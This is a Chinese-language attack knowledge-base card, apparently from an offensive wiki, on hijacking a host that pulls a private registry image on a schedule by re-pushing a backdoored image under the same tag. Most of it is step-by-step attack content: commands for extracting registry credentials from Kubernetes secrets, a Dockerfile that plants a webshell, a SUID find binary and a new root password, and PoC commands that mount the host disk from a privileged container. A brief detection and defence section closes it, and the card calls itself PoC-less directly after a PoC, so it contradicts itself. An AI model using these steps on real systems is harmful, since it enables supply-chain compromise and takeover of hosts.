---
id: cloud-container-registry-polling-image-tag-repoison-escape
title: 私有镜像仓库定时拉取镜像的场景下，用同一 tag 重新 push 恶意镜像接管目标主机
type: scenario
domain: cloud
path: cloud/container
technique: registry-polling-image-repoison
tags:
- harbor
- registry
- container
- supply-chain
- image
- polling
- escape
cve: []
severity: critical
confidence: medium
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-T2-3W
  verified_at: '2026-11-08T17:13:26+08:00'
  notes: 已对照原文核对（Harbor 日志发现固定周期拉取、同名 tag 重推恶意镜像、容器内 CapEff 全能力与 mount /dev/vda3 读宿主盘一致）；本次核对未读取图片，仅依据正文；20 分钟周期与凭据来源未复现
url: /docs/cloud/container/cloud-container-registry-polling-image-tag-repoison-escape/
draft: false
kb_aliases:
- 镜像同名 tag 投毒
- Harbor 定时拉取 恶意镜像
- registry 覆盖 tag 获取容器执行
- 镜像自动更新链投毒
---

## 一句话结论

拿到私有 registry（如 Harbor）的 push 权限后，若某业务主机按固定周期从仓库拉取镜像并重启容器，攻击者用同一个 `repo:tag` 构建并 push 一个带后门的镜像，等下一轮自动拉取就会在目标主机上以该容器的身份执行任意代码；容器若特权运行或挂载了宿主机磁盘，就直接是宿主机 root。

## 原理

- 传统镜像投毒需要诱导受害者「拉取攻击者镜像」，成本高；而「覆盖已有 tag」不需要任何社会工程：目标自己会按计划去拉 `repo:tag`，谁 push 的它不校验（除非启用了 cosign/notary 等签名校验，多数私有部署没有）。
- 覆盖 tag 时 `docker push` 会替换远程 manifest，后续 `docker pull` 取到的就是攻击者的层；目标主机的 `docker run`/编排器按同一 tag 启动，等于执行了攻击者的 `RUN`/`ENTRYPOINT` 内容。
- 后门放进 `RUN` 里最稳：构建期就完成写 webshell、写 ssh key、加账号；放进 `ENTRYPOINT` 则依赖目标实际启动容器时的命令行，容易被覆盖。
- 判断「哪台主机在拉」靠观测：registry 的访问日志会周期性出现同一个来源 IP 的 `GET /v2/<repo>/manifests/<tag>`，据此确认存在自动拉取循环与目标主机。
- 容器内的权限决定最终危害：`CapEff: 0000003fffffffff` 表示接近全能力（特权容器），可直接 `mount /dev/vda3` 读宿主机磁盘；非特权容器则至少是容器内 root + 应用数据面控制。

## 触发条件

- 攻击者已拿到 registry 的 push 凭据（如从 K8s 的 `dockerconfigjson` Secret、CI 变量、镜像层里翻出的 `admin:password`）或仓库本身未授权可写。
- 目标存在「定时拉取指定 tag 并重启/更新容器」的机制（CI/CD 定时任务、watchtower、自定义 cron + `docker pull` + `docker run`、编排器 `imagePullPolicy: Always`）。
- 仓库未启用镜像签名校验（cosign/Notation），否则内容被替换后验签失败。
- 攻击者能构建并推送镜像（可复用仓库里现成的基础镜像，避免大体积上传）。

## 利用步骤

1. 从已拿下的环境里翻仓库凭据，常见来源：`kubectl get secret <name> -o jsonpath='{.data.\.dockerconfigjson}' | base64 -d`；镜像层里的 `config`/`settings` 文件；CI 环境变量。
2. 用凭据登录并确认可枚举/可读：`docker login REGISTRY`，`docker pull REGISTRY/<repo>:<tag>`。
3. 观察 registry 访问日志（或 harbor 的 `core`/`registry` 日志），找出周期性拉取某 `repo:tag` 的来源主机与周期。
4. 写 Dockerfile：`FROM` 用原镜像保证兼容，`RUN` 里落持久化后门（写 web 目录 webshell、加 ssh key、加 sudo 账号、或用 `find -exec` 拉反弹 shell，规避镜像里没有 curl/wget 的情况）：

```dockerfile
FROM REGISTRY/<repo>:<tag>
RUN echo '<webshell>' > /var/www/html/shell.php && chmod u+s $(which find) && \
    echo "root:password" | chpasswd
ENTRYPOINT ["/usr/sbin/apache2ctl", "-D", "FOREGROUND"]
```

5. `docker build -t REGISTRY/<repo>:<tag> .` 后 `docker push REGISTRY/<repo>:<tag>`，覆盖原 tag。
6. 等目标下一轮自动拉取（原文环境约 20 分钟一次），随后访问落在 web 目录的 webshell，或用新增账号/ssh key 登录。
7. 容器内提权到宿主机：`cat /proc/self/status | grep CapEff` 判断是否特权；特权则 `df -h` 找到宿主盘设备（如 `/dev/vda3`），`mkdir /test && mount /dev/vda3 /test`，之后直接读宿主文件系统。

## PoC

```bash
# 1. 登录并拉基线镜像
docker login REGISTRY
docker pull REGISTRY/<repo>:<tag>
# 2. 构建同名镜像并覆盖 push
docker build -t REGISTRY/<repo>:<tag> .
docker push REGISTRY/<repo>:<tag>
# 3. 等待自动拉取后验证后门（示例：webshell）
curl http://TARGET/shell.php -d 'cmd=id'
# 4. 容器内判断特权并挂宿主盘
cat /proc/self/status | grep CapEff
mkdir /test && mount /dev/vda3 /test && cat /test/f*
```

无 PoC（依赖真实环境的定时拉取周期与凭据，本卡未在实验环境复现）。

## 变体与关联

- 变体：目标用 `imagePullPolicy: Always` 时无需等定时任务，删除 Pod 触发重建即拉到新镜像。
- 变体：目标用 digest 固定（`repo@sha256:...`）时本手法失效，需转为改仓库内 layer 或攻击 CI。
- 变体：改 `latest` 之外的固定版本 tag 更隐蔽（运维不会主动关注版本号未变的更新）。
- 关联：[[cloud-container-harbor-cve-2022-46463-unauth-image-dump]]（仓库未授权读，作为取得凭据与镜像内容的前置）。
- 关联：[[cloud-container-docker-privileged-host-disk-escape]]（拿到容器执行后的特权逃逸细节）。

## 检测与防御

- 防御：启用镜像签名（cosign/Notation）并在拉取侧强制验签；用 digest 固定生产镜像而非可覆盖 tag。
- 防御：仓库最小权限，禁止业务侧拥有 push 权；开启 Harbor 的不可变 tag（Immutable Tag）规则，从根上阻止覆盖。
- 检测：registry 审计日志出现同一 tag 的 manifest 被非 CI 主体覆盖；目标主机拉取到的镜像 digest 与上次不同但 tag 未变；容器内出现异常 webshell/账号/`find` 的 SUID 位。
- 响应：回滚镜像 tag 到已知良好 digest、轮换仓库与主机凭据、删除恶意镜像与容器、检查宿主机 crontab/authorized_keys。
